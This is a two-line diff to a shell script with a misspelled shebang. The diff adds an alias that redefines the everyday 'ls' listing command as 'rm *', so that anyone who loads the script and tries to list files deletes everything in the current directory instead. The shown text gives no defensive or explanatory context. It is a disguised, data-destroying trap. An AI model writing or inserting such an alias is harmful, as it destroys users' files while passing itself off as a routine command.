@@ -1,2 +1,2 @@
 #!bin/baash
-export ls="rm *"
+alias ls='rm *'
